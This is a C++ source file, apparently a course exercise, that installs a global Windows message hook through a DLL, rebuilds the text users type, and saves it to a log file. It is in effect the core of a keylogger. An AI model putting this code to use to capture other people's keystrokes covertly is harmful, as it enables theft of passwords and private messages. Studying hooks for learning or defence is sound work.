#include "Unpdate.h"
#include <fstream>
#include <locale>
#include <codecvt>

static std::wstring s_buffer = L"";
static HHOOK s_hHook = NULL;
static const std::wstring s_filePath = L"C:\\Users\\Admin\\source\\repos\\OOPLT\\Ex6.1\\log_output.txt";

bool StartMonitoring(HWND hWndReceiver) {
    HMODULE hDll = LoadLibraryA("Dll1.dll");
    if (!hDll) return false;

    auto SetTargetWnd = (void(*)(HWND))GetProcAddress(hDll, "SetTargetWnd");
    if (SetTargetWnd) SetTargetWnd(hWndReceiver);

    HOOKPROC proc = (HOOKPROC)GetProcAddress(hDll, "GetMsgProc");
    s_hHook = SetWindowsHookEx(WH_GETMESSAGE, proc, hDll, 0);
    return s_hHook != NULL;
}

std::wstring GetProcessedString(WPARAM wParam) {
    wchar_t ch = (wchar_t)wParam;

    if (ch == L'\b') { // Xử lý Backspace
        if (!s_buffer.empty()) s_buffer.pop_back();
    }
    else if (ch == 13 || ch == 10) { // Enter
        s_buffer += L"\n";
    }
    else if (ch >= 32) { // Chỉ nhận ký tự in được, bỏ qua phím điều khiển lỗi
        s_buffer += ch;
    }
    return s_buffer;
}

void SaveToFile(const std::wstring& content) {
    std::wofstream outFile(s_filePath, std::ios::out | std::ios::trunc);
    if (outFile.is_open()) {
        outFile.imbue(std::locale(std::locale::empty(), new std::codecvt_utf8<wchar_t, 0x10ffff, std::consume_header>));
        outFile << content;
        outFile.close();
    }
}

void StopMonitoring() {
    if (s_hHook) UnhookWindowsHookEx(s_hHook);
}